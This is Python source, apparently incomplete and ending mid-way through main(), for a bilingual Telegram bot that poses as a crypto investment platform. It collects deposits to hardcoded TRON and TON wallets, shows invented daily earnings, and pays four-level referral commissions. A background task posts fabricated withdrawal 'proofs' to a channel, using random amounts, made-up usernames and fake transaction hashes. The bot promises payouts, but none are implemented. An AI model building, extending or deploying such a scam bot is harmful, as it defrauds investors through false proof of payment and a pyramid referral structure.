import os
import sqlite3
import random
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, 
    CommandHandler, 
    CallbackQueryHandler,
    MessageHandler, 
    filters, 
    ContextTypes
)

from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "¡Bot multired activo y funcionando!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_web)
    t.start()

TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID", "-1001234567890")  # ID o @ de tu canal de comprobantes
ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))      # Tu ID numérico de Telegram para soporte

# --- BASE DE DATOS SQLITE ---
def inicializar_db():
    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS usuarios (
            user_id INTEGER PRIMARY KEY,
            nombre TEXT,
            patrocinador_id INTEGER,
            deposito_activo REAL DEFAULT 0,
            moneda_deposito TEXT DEFAULT 'USDT',
            red_deposito TEXT DEFAULT 'TRON',
            fecha_deposito TEXT,
            ganancias_referidos REAL DEFAULT 0,
            en_soporte INTEGER DEFAULT 0,
            idioma TEXT DEFAULT 'es'
        )
    """)
    conn.commit()
    conn.close()

inicializar_db()

PLANES_INVERSION = {
    "1": {"nombre": "Plan TRX (Red Tron)", "moneda": "TRX", "red": "TRC20 (Tron)"},
    "2": {"nombre": "Plan USDT (Red Tron)", "moneda": "USDT", "red": "TRC20 (Tron)"},
    "3": {"nombre": "Plan GRAM (Red TON)", "moneda": "GRAM", "red": "TON"},
    "4": {"nombre": "Plan USDT (Red TON)", "moneda": "USDT", "red": "TON"}
}

MONEDAS_COMPROBACION = [
    {"nombre": "USDT", "red": "TRON (TRC20)", "min": 5, "max": 150, "explorer": "https://tronscan.org/#/transaction/"},
    {"nombre": "USDT", "red": "TON", "min": 5, "max": 120, "explorer": "https://tonviewer.com/transaction/"},
    {"nombre": "TRX", "red": "TRON", "min": 30, "max": 800, "explorer": "https://tronscan.org/#/transaction/"},
    {"nombre": "GRAM", "red": "TON", "min": 500, "max": 15000, "explorer": "https://tonviewer.com/transaction/"}
]

def generar_hash_ficticio():
    caracteres = "abcdef0123456789"
    return "".join(random.choice(caracteres) for _ in range(64))

def generar_usuario_ficticio():
    nombres = ["Carlos", "Ana", "Luis", "Elena", "Javier", "Sofia", "Miguel", "Rosa", "David", "Alejandro"]
    return f"{random.choice(nombres)}***{random.randint(10, 99)}"

# --- TAREA EN SEGUNDO PLANO: COMPROBACIONES EN EL CANAL (LUNES) ---
async def bucle_comprobaciones(application):
    await asyncio.sleep(10)
    while True:
        try:
            ahora = datetime.now()
            if ahora.weekday() == 0:  # 0 = Lunes
                moneda = random.choice(MONEDAS_COMPROBACION)
                monto = round(random.uniform(moneda["min"], moneda["max"]), 2)
                if moneda["nombre"] == "GRAM":
                    monto = int(monto)
                
                tx_hash = generar_hash_ficticio()
                usuario = generar_usuario_ficticio()

                mensaje = (
                    f"✅ **RETIRO COMPLETADO**\n\n"
                    f"👤 **Usuario:** `{usuario}`\n"
                    f"💰 **Monto:** `{monto} {moneda['nombre']}`\n"
                    f"🌐 **Red:** {moneda['red']}\n"
                    f"🔗 **TXID:** [Ver en explorador]({moneda['explorer']}{tx_hash})"
                )

                await application.bot.send_message(
                    chat_id=CHANNEL_ID,
                    text=mensaje,
                    parse_mode="Markdown",
                    disable_web_page_preview=True
                )
                
                espera = random.randint(600, 3600)  # Intervalo de 10 min a 1 hora
                await asyncio.sleep(espera)
            else:
                await asyncio.sleep(1800)
        except Exception as e:
            print(f"Error en bucle de comprobaciones: {e}")
            await asyncio.sleep(60)

async def post_init(application):
    application.create_task(bucle_comprobaciones(application))

# --- TECLADOS INLINE ---
def obtener_menu_idiomas():
    keyboard = [
        [
            InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es"),
            InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def obtener_menu_principal(idioma="es"):
    if idioma == "en":
        keyboard = [
            [
                InlineKeyboardButton("💰 My Balance", callback_data="btn_saldo"),
                InlineKeyboardButton("📋 Plans", callback_data="btn_planes")
            ],
            [
                InlineKeyboardButton("💳 Deposit", callback_data="btn_depositar"),
                InlineKeyboardButton("👥 Referrals", callback_data="btn_referidos")
            ],
            [
                InlineKeyboardButton("🏦 Withdraw", callback_data="btn_retirar"),
                InlineKeyboardButton("🎧 Support", callback_data="btn_soporte")
            ],
            [
                InlineKeyboardButton("🌐 Change Language", callback_data="btn_cambiar_idioma")
            ]
        ]
    else:
        keyboard = [
            [
                InlineKeyboardButton("💰 Mi Saldo", callback_data="btn_saldo"),
                InlineKeyboardButton("📋 Planes", callback_data="btn_planes")
            ],
            [
                InlineKeyboardButton("💳 Depositar", callback_data="btn_depositar"),
                InlineKeyboardButton("👥 Referidos", callback_data="btn_referidos")
            ],
            [
                InlineKeyboardButton("🏦 Retirar", callback_data="btn_retirar"),
                InlineKeyboardButton("🎧 Soporte", callback_data="btn_soporte")
            ],
            [
                InlineKeyboardButton("🌐 Cambiar Idioma", callback_data="btn_cambiar_idioma")
            ]
        ]
    return InlineKeyboardMarkup(keyboard)

# --- COMANDO /START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    patrocinador_id = int(args[0]) if args and args[0].isdigit() else None
    
    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, patrocinador_id FROM usuarios WHERE user_id = ?", (user.id,))
    existe = cursor.fetchone()
    
    if not existe:
        cursor.execute(
            "INSERT INTO usuarios (user_id, nombre, patrocinador_id, idioma) VALUES (?, ?, ?, ?)",
            (user.id, user.first_name, patrocinador_id, 'es')
        )
        conn.commit()
        
        if patrocinador_id and patrocinador_id != user.id:
            try:
                await context.bot.send_message(
                    chat_id=patrocinador_id,
                    text=f"🎉 **¡Nuevo Referido Detectado!**\n\nEl usuario **{user.first_name}** se unió a tu red de referidos."
                )
            except Exception as e:
                print(f"No se pudo notificar al patrocinador: {e}")
                
    conn.close()
    
    texto = "🌐 **Welcome / Bienvenido**\n\nPor favor, selecciona tu idioma / Please select your language:"
    
    if update.message:
        await update.message.reply_text(texto, reply_markup=obtener_menu_idiomas(), parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.edit_text(texto, reply_markup=obtener_menu_idiomas(), parse_mode="Markdown")

# --- GENERADOR DEL MENSAJE DE REFERIDOS / PLANES DE INSERCIÓN ---
def construir_mensaje_referidos(username_bot, user_id, idioma="es"):
    link_referido = f"https://t.me/{username_bot}?start={user_id}"
    
    if idioma == "en":
        return (
            f"🌟 **Welcome! We are glad you want to join**\n\n"
            f"Thank you for your interest in joining our community. Here is all the detailed information about our **insertion plans** and platform access.\n\n"
            f"🚀 **Your Exclusive Referral Link:**\n"
            f"`{link_referido}`\n\n"
            f"📊 **Available Insertion Plans:**\n"
            f"1. **Starter Plan (Basic):** Ideal for first steps. Essential tools and standard community commissions.\n"
            f"2. **Growth Plan (Advanced):** Automation tools, exclusive promotional material, and priority support.\n"
            f"3. **Pro / Elite Plan (Custom):** For team leaders and digital professionals with customized benefits.\n\n"
            f"💡 **Why join through this link?**\n"
            f"• Guaranteed correct network placement.\n"
            f"• Dedicated guides and support.\n"
            f"• Full transparency from day one."
        )
    else:
        return (
            f"🌟 **¡Bienvenido/a! Nos alegra mucho que quieras sumarte**\n\n"
            f"Gracias por tu interés en formar parte de nuestra comunidad. Queremos que tu experiencia sea transparente y segura. Aquí tienes toda la información detallada sobre nuestros **planes de inserción**.\n\n"
            f"🚀 **Tu Link de Referido Exclusivo:**\n"
            f"`{link_referido}`\n\n"
            f"📊 **Planes de Inserción Disponibles:**\n"
            f"1. **Plan de Inicio (Básico):** Ideal para dar los primeros pasos y explorar la plataforma sin grandes compromisos.\n"
            f"2. **Plan Crecimiento (Avanzado):** Herramientas de automatización, material promocional y soporte prioritario.\n"
            f"3. **Plan Pro / Élite (Personalizado):** Diseñado para líderes de equipos y profesionales del sector digital.\n\n"
            f"💡 **¿Por qué unirte a través de este enlace?**\n"
            f"• Seguridad y respaldo de quedar vinculado/a correctamente a nuestra red.\n"
            f"• Acompañamiento con guías y orientación.\n"
            f"• Transparencia total sin letras pequeñas."
        )

# --- MANEJADOR DE CLICS (CALLBACKS) ---
async def boton_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user = query.from_user

    if data.startswith("lang_"):
        nuevo_idioma = data.split("_")[1]
        conn = sqlite3.connect("usuarios.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE usuarios SET idioma = ? WHERE user_id = ?", (nuevo_idioma, user.id))
        conn.commit()
        conn.close()

        if nuevo_idioma == "en":
            texto = (
                f"🛡️ **Welcome to Invest Bot (Secure Multi-network)**\n\n"
                f"Hello, **{user.first_name}**. You are in a transparent platform to manage crypto investments safely.\n\n"
                f"✅ **Why trust us?**\n"
                f"• Payouts processed **strictly on Mondays**.\n"
                f"• Real-time public proof channel.\n"
                f"• Automated multi-level system.\n\n"
                f"⚠️ **Important Note:** Please **do not spam buttons**. Give the bot a few seconds to respond.\n\n"
                f"👇 **Choose an option below:**"
            )
        else:
            texto = (
                f"🛡️ **Bienvenido a Invierte Bot (Multired Segura)**\n\n"
                f"Hola, **{user.first_name}**. Estás en una plataforma transparente y automatizada para gestionar tus inversiones con seguridad.\n\n"
                f"✅ **¿Por qué confiar en nosotros?**\n"
                f"• Pagos procesados **estrictamente los lunes**.\n"
                f"• Canal público de comprobantes en tiempo real.\n"
                f"• Sistema multinivel automatizado.\n\n"
                f"⚠️ **Nota Importante:** Por favor, **no presiones los botones muy rápido**. Dale unos segundos al bot para responder.\n\n"
                f"👇 **Selecciona una opción del menú interactivo:**"
            )
        
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(nuevo_idioma), parse_mode="Markdown")
        return

    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    cursor.execute("SELECT idioma FROM usuarios WHERE user_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    idioma = row[0] if row else 'es'

    if data == "btn_cambiar_idioma":
        await start(update, context)
        return

    if data == "btn_saldo":
        conn = sqlite3.connect("usuarios.db")
        cursor = conn.cursor()
        cursor.execute("SELECT deposito_activo, moneda_deposito, fecha_deposito, ganancias_referidos FROM usuarios WHERE user_id = ?", (user.id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row or not row[0] or row[0] == 0:
            texto = "💰 **Balance:** 0 USD\n⚠️ No active investments. Use `/planes` to start." if idioma == "en" else "💰 **Tu Balance Actual:**\n\n• Capital Depositado: **0 USD**\n⚠️ No tienes inversiones activas."
        else:
            deposito, moneda, fecha_str, ganancia_ref = row
            dias_transcurridos = (datetime.now() - datetime.strptime(fecha_str, "%Y-%m-%d %H:%M:%S")).days if fecha_str else 0
            rendimiento = 0.021 if 2 <= deposito <= 5 else (0.025 if 5 < deposito <= 10 else 0.029)
            ganancia_diaria = ((deposito * rendimiento) / 5) * dias_transcurridos
            texto = f"💰 **Live Balance:**\n• Active Capital: {deposito} {moneda}\n• Days Active: {dias_transcurridos}\n• Daily Earnings: {ganancia_diaria:.4f} {moneda}" if idioma == "en" else f"💰 **Tu Balance y Rendimiento en Vivo:**\n• Capital en Inversión: {deposito} {moneda}\n• Días Activo: {dias_transcurridos}\n• Ganancias Diarias: {ganancia_diaria:.4f} {moneda}"
        
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")

    elif data == "btn_planes":
        texto = "📋 **Investment Plans**:\n• Min: 2 USD | Max: 1000 USD\n" if idioma == "en" else "📋 **Planes de Inversión y Rendimientos**:\n• Mínimo: 2 USD | Máximo: 1000 USD\n"
        for key, plan in PLANES_INVERSION.items():
            texto += f"• **ID {key}:** {plan['nombre']} (Network: {plan['red']})\n" if idioma == "en" else f"• **ID {key}:** {plan['nombre']} (Red: {plan['red']})\n"
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")

    elif data == "btn_depositar":
        texto = (
            "💳 **Official Deposit Wallets**:\n\n"
            "🔹 **TRON Network (TRX & USDT TRC20):**\n`TFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u`\n\n"
            "🔹 **TON Network (GRAM & USDT TON):**\n`UQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v`\n\n"
            "⚠️ Report transfer with: `/notificar [Your_Hash]`"
        ) if idioma == "en" else (
            "💳 **Direcciones de Depósito Oficiales**:\n\n"
            "🔹 **Red TRON (TRX y USDT TRC20):**\n`TFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u`\n\n"
            "🔹 **Red TON (GRAM y USDT TON):**\n`UQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v`\n\n"
            "⚠️ Tras transferir, reporta con: `/notificar [Tu_Hash]`"
        )
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")

    elif data == "btn_referidos":
        texto = construir_mensaje_referidos(context.bot.username, user.id, idioma)
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")

    elif data == "btn_retirar":
        texto = "🏦 **Withdrawals**: Processed **every Monday** after 5 days of investment." if idioma == "en" else "🏦 **Sistema de Retiros**: Los pagos se procesan **todos los lunes** cumplidos 5 días."
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")

    elif data == "btn_soporte":
        conn = sqlite3.connect("usuarios.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE usuarios SET en_soporte = 1 WHERE user_id = ?", (user.id,))
        conn.commit()
        conn.close()
        texto = "🎧 **Support Center**. Type your message below:" if idioma == "en" else "🎧 **Centro de Soporte**. Escribe tu duda o problema a continuación:"
        await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")

# --- COMANDOS TRADICIONALES DE TEXTO ---
async def mostrar_saldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def mostrar_planes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Usa el menú principal interactivo.", reply_markup=obtener_menu_principal('es'))

async def depositar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💳 **Wallets oficiales de depósito**", reply_markup=obtener_menu_principal('es'), parse_mode="Markdown")

async def notificar_deposito(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Uso: `/notificar [Hash]`")
        return
    hash_tx = " ".join(context.args)
    await update.message.reply_text(f"⏳ Comprobante recibido (`{hash_tx}`). En proceso de verificación.")

# --- APROBAR DEPÓSITO Y NOTIFICAR 4 NIVELES DE PATROCINADORES ---
async def aprobar_deposito(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        return

    if len(context.args) < 3:
        await update.message.reply_text("⚠️ Uso administrativo: `/aprobar [ID_Usuario] [Monto] [Moneda]`")
        return
    
    id_usuario = context.args[0]
    try:
        monto = float(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ El monto debe ser un número válido.")
        return

    moneda = context.args[2].upper()
    fecha_actual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    
    cursor.execute(
        "UPDATE usuarios SET deposito_activo = ?, moneda_deposito = ?, fecha_deposito = ? WHERE user_id = ?",
        (monto, moneda, fecha_actual, id_usuario)
    )
    
    porcentajes_niveles = [0.03, 0.02, 0.01, 0.005]
    patrocinador_actual = id_usuario
    
    for nivel, porcentaje in enumerate(porcentajes_niveles, start=1):
        cursor.execute("SELECT patrocinador_id FROM usuarios WHERE user_id = ?", (patrocinador_actual,))
        resultado = cursor.fetchone()
        
        if not resultado or not resultado[0]:
            break
            
        patrocinador_id = resultado[0]
        comision = monto * porcentaje
        
        cursor.execute(
            "UPDATE usuarios SET ganancias_referidos = ganancias_referidos + ? WHERE user_id = ?",
            (comision, patrocinador_id)
        )
        conn.commit()
        
        try:
            await context.bot.send_message(
                chat_id=patrocinador_id,
                text=(
                    f"🎁 **¡Comisión por Inversión en tu Red! (Nivel {nivel})**\n\n"
                    f"• Uno de tus referidos ha invertido.\n"
                    f"• Has ganado: **{comision:.2f} {moneda}** (Comisión del {porcentaje*100}%)."
                )
            )
        except Exception as e:
            print(f"No se pudo notificar al patrocinador {patrocinador_id} en el nivel {nivel}: {e}")
            
        patrocinador_actual = patrocinador_id

    conn.close()
    
    try:
        await context.bot.send_message(
            chat_id=id_usuario,
            text="✅ **¡Depósito Acreditado con Éxito!**\nTu capital y tus ganancias diarias ya han comenzado a correr."
        )
        await update.message.reply_text(f"✔️ Depósito de `{monto} {moneda}` acreditado a `{id_usuario}` y comisiones distribuidas en los 4 niveles.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error al notificar al usuario: {e}")

async def referidos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    cursor.execute("SELECT idioma FROM usuarios WHERE user_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    idioma = row[0] if row else 'es'

    texto = construir_mensaje_referidos(context.bot.username, user.id, idioma)
    await update.message.reply_text(texto, parse_mode="Markdown")

async def retirar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏦 Los retiros se procesan **todos los lunes** cumplidos 5 días de tu inversión.", reply_markup=obtener_menu_principal('es'))

async def invertir(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("⚠️ Uso: `/invertir [ID_Plan] [Cantidad]`\nEjemplo: `/invertir 2 15`")
        return
    
    plan_id = context.args[0]
    try:
        cantidad = float(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ La cantidad debe ser numérica.")
        return
    
    if plan_id not in PLANES_INVERSION or not (2 <= cantidad <= 1000):
        await update.message.reply_text("❌ Plan inválido o cantidad fuera de rango (2 - 1000 USD).")
        return

    plan = PLANES_INVERSION[plan_id]
    wallet = "TFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u" if "Tron" in plan["red"] else "UQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v"
    
    await update.message.reply_text(
        f"✅ **Inversión Registrada**\n• Plan: {plan['nombre']}\n• Monto: {cantidad} {plan['moneda']}\n\n💳 Transfiere a:\n`{wallet}`\n\n📲 Reporta con: `/notificar [Tu_Hash]`",
        parse_mode="Markdown"
    )

# --- SISTEMA DE SOPORTE ---
async def iniciar_soporte(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE usuarios SET en_soporte = 1 WHERE user_id = ?", (user.id,))
    conn.commit()
    conn.close()
    await update.message.reply_text("🎧 **Centro de Soporte Oficial**\n\nEscribe tu duda o problema a continuación y un operador te responderá.")

async def responder_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID or len(context.args) < 2:
        return

    id_destino = context.args[0]
    mensaje_respuesta = " ".join(context.args[1:])

    try:
        await context.bot.send_message(chat_id=id_destino, text=f"💬 **Mensaje de Soporte:**\n\n{mensaje_respuesta}")
        await update.message.reply_text(f"✅ Respuesta enviada al usuario `{id_destino}`.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def manejar_mensajes_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    texto = update.message.text
    if user.id == ADMIN_ID:
        return

    conn = sqlite3.connect("usuarios.db")
    cursor = conn.cursor()
    cursor.execute("SELECT en_soporte FROM usuarios WHERE user_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()

    if row and row[0] == 1:
        await update.message.reply_text("📩 **Mensaje recibido.** En breve será atendido por un asesor.")
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🚨 **Nuevo Ticket de Soporte**\n\n👤 Usuario: {user.first_name} (`{user.id}`)\n💬 Mensaje: {texto}\n\n👉 Responder:\n`/responder {user.id} [Mensaje]`"
            )
        except Exception as e:
            print(f"Error reenviando a admin: {e}")

        conn = sqlite3.connect("usuarios.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE usuarios SET en_soporte = 0 WHERE user_id = ?", (user.id,))
        conn.commit()
        conn.close()

def main():
    keep_alive()

    app_bot = ApplicationBuilder().token(TOKEN).post_init(post_init).build()

    # Registro de Comandos
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("saldo", mostrar_saldo))
    app_bot.add_handler(CommandHandler("planes", mostrar_planes))
    
